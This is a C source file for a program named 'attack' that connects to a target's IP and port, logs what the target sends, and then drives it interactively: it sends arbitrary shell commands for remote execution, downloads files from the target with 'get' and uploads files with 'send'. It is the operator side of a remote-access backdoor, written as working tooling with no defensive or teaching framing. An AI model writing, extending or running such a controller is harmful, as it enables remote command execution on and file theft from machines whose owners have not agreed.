#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include "structs.h"
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>


ssize_t my_read(int fd, void *buf, size_t count){
    ssize_t r;
    if( (r = read(fd,buf,count)) < 0 ){
        perror("read");
        exit(1);
    }
    return r;
}

ssize_t my_write(int fd, void *buf, size_t count){
    ssize_t w;
    if( (w = write(fd,buf,count)) < 0){
        perror("write");
        exit(1);
    }
    return w;
}

int my_open(char *filename, int flags){
    int op;
    if( ( op = open(filename, flags)) < 0){
        perror("open");
        exit(1);
    }
    return op;
}

int my_close(int fd){
    int c;
    if( (c = close(fd)) < 0 ){
        perror("close");
        exit(1);
    }
    return c;
}

int my_socket(int domain, int type, int protocol){
    int sock;
    if( (sock = socket(domain,type,protocol)) < 0 ){
        perror("socket");
        exit(1);
    }
    return sock;
}

int my_bind(int fd, const struct sockaddr *addr, socklen_t addrlen){
    int b;
    if( (b = bind(fd,addr,addrlen)) < 0 ){
        perror("bind");
        exit(1);
    }
    return b;
}

int my_listen(int sockfd, int backlog){
    int l;
    if( (l = listen(sockfd,backlog)) < 0 ){
        perror("listen");
        exit(1);
    }
    return l;
}

int my_accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen){
    int a;
    if ((a = accept(sockfd, addr, addrlen)) < 0 ){
        perror("accept");
        exit(1);
    }
    return a;
}

int my_connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen){
    int conn;
    if( (conn = connect(sockfd, addr, addrlen)) < 0 ){
        perror("connect");
        exit(1);
    }
    return conn;
}





struct attack_args* get_args(int argc, char** argv){
    if(argc > 3 || argc < 2){
        printf("Usage: ./attack ip port\n");
        exit(1);
    }
    struct attack_args* args = malloc(sizeof(struct attack_args));
    if(argc == 2){
        printf("No port selected, using 5001.\n");
        args->port = malloc(sizeof(char)*5);
        bzero(args->port,5*sizeof(char));
        strncpy(args->port,"5001",4);
    }
    args->ip = malloc(sizeof(char)*strlen(argv[1])+1);
    bzero(args->ip,strlen(argv[1])*sizeof(char)+1);
    strncpy(args->ip,argv[1],strlen(argv[1]));
    if(argc == 3){
        args->port = malloc(sizeof(char)*strlen(argv[2])+1);
        bzero(args->port,strlen(argv[2])+1);
        strncpy(args->port,argv[2],strlen(argv[2]));
    }
    return args;
}


int ConnectToTarget(struct attack_args* args){
    struct sockaddr_in addr;
    int fd = 0;
    bzero(&addr,sizeof(struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(args->port));
    if( (fd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
        perror("socket");
        exit(0);
    }
    if(inet_pton(AF_INET, args->ip, &addr.sin_addr) <= 0){
        perror("inet_pton");
        exit(1);
    }
    if(connect(fd, (struct sockaddr*)&addr, sizeof(addr))< 0){
        perror("connect");
        exit(1);
    }
    return fd;
}

void ReceiveData(int fd){
    char msg[256];
    bzero(msg,256);
    FILE* fp = fopen("log.txt","a");
    printf("Receiving data...\n");
    while(1){
        my_read(fd,msg,255);
        if(strstr(msg,"\r") != NULL)
           break;
        fprintf(fp,"%s",msg);
        bzero(msg,256);
    }
    printf("OK\n");
    fclose(fp);
}


char* Get_Dir(char* file){
    int count = 0,pos = 0;
    while(file[pos] != '\0'){
        if(file[pos] == '/')
            count++;
        pos++;
    }
    if(!count){
        char* dir = calloc(2,sizeof(char));
        strncpy(dir,".",1);
        return dir;
    }
    else{
        pos = 0;
        int len = 0, i = 0;
        while(i < count){
            len++;
            if(file[pos++] == '/')
                i++;
        }
        printf("len is: %d\n",len);
        char* dir = calloc(len,sizeof(char));
        strncpy(dir,file,len-1);
        return dir;
    }

}

char* Get_File_Name(char* file){
    char* tok = NULL;
    size_t count = 0, pos = 0;
    while(file[pos] != '\0'){
        if(file[pos] == '/')
            count++;
        pos++;
    }
    // File has no slashes
    if(!count)
        return file;
    else{
        pos = 0;
        tok = strdup(file);
        while(pos < count){
            tok = strstr(tok,"/");
            tok++;
            pos++;
        }
        char* name = strtok(tok,"\n");
        return name;
    }
}




void SendCommands(int fd){
    while(1){
        char cmd[256] = {0};
        printf("What?\n");
        if(fgets(cmd,256,stdin)){
            my_write(fd,cmd,256);
        }
        else{
            perror("fgets");
            exit(1);
        }
        char* tok = strtok(cmd," "), *file = NULL;
        if(!strcmp(tok,"get")  || !strcmp(tok,"send"))
            file = strtok(NULL," \n");
        int code = 0;
        my_read(fd,&code,sizeof(int));
        printf("Error code is: %d\n",code);
        char resp[64] = {0};
        printf("Target:\n");
        printf("*======================*\n");
        if(code == 1){ // Normal command
            printf("<------------ Output ------------>\n");
            while(1){
                my_read(fd,resp,63);
                printf("%s",resp);
                if(strstr(resp,"\r")){
                    break;
                }
                bzero(resp,64);
            }
            printf("<------------  END  ------------->\n");
        }
        else if(code == -1){ // NORMAL COMMAND FAILURE
            printf("Command failed to execute. Popen failed.\n");
            printf("*======================*\n");
            continue;
        }
        else if(code == -2){// NORMAL COMMAND INVALID
            printf("Invalid command.\n");
            printf("*======================*\n");
            continue;
        }
        else if(code == -3){// ERROR
            printf("Something went really bad, server closed connection\n");
            printf("*======================*\n");
            continue;
        }
        else if(code == 404){ // GET NOT FOUND
            printf("File not found!\n");
            printf("*======================*\n");
        }
        else if(code == 2){ // GET
            printf("File found!\n");
            printf("Receiving file...\n");
            if(mkdir("saved_files",0777) < 0){
                perror("mkdir");
                exit(1);
            }
            char* full_name = calloc(1,strlen(file) + 13);
            sprintf(full_name,"saved_files/%s",file);
            int file_d = my_open(full_name,O_CREAT|O_WRONLY|S_IRWXU);
            int r = 0,count = 0, len = 0;
            char msg[256] = {0};
            while(1){
                my_read(fd,&len,sizeof(int));
                r = my_read(fd,msg,len);
                my_write(file_d,msg,len);
                if(len < 255)
                    break;
                bzero(msg,256);
                count += r;
            }
            printf("got: %d bytes\n",count);
            printf("File saved.\n");
        }
        else if(code == 3){ // SEND
            printf("Sending file...\n");
            char msg[256] = {0};
            /*    char* name = Get_Dir(file);
                DIR* dir = opendir(name);
                printf("name is: %s\n",name);
                if(!dir){
                    perror("opendir");
                    exit(1);
                }
                struct dirent* pdir = readdir(dir);
                if(!pdir){
                    perror("readdir");
                    exit(1);
                }*/
            //char* filename = Get_File_Name(file);
            int r = 0,file_d = my_open(file,O_RDONLY);
            while(1){
                r = my_read(file_d,msg,255);
                my_write(fd,&r,sizeof(int));
                my_write(fd,msg,r);
                bzero(msg,256);
                if(r < 255)
                    break;
            }
            printf("File sent successfuly!\n");
        }
        printf("*======================*\n");
    }
}

int main(int argc, char** argv){
    int fd = 0;
    struct attack_args* args = get_args(argc,argv);
    fd = ConnectToTarget(args);
    ReceiveData(fd);
    SendCommands(fd);
}
